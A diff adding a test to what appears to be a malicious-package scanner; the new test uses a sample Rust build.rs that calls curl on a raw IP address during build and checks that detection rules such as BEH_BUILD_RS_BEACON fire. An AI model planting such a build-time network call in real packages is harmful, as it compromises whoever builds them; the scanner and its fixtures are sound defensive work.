@@ -36,3 +36,9 @@ def test_behaviour_rules_raise_the_funnel_score():
     assert combined["level"] == "alert" and {"BEH_RECON_AND_SEND", "BEH_DEPENDENCY_CONFUSION"} <= set(combined["rules_matched"])
     assert package_features.combine(scan, ["system_info"], "npm") is scan
     assert package_features.combine(scan, ["system_info", "http_send"], "pypi") is scan, "npm-only rule"
+
+
+def test_build_rs_beacon_rule():
+    flags = package_features.profile([("pkg-1.0.0/build.rs", b'fn main(){ std::process::Command::new("curl").arg("-s").arg("http://1.2.3.4/x").status().unwrap(); }')])
+    assert {"build_rs", "build_rs_side_effects", "download_tool", "raw_ip_url"} <= set(flags)
+    assert "BEH_BUILD_RS_BEACON" in package_features.combine({"score": 0, "findings": [], "rules_matched": []}, flags, "crates")["rules_matched"]
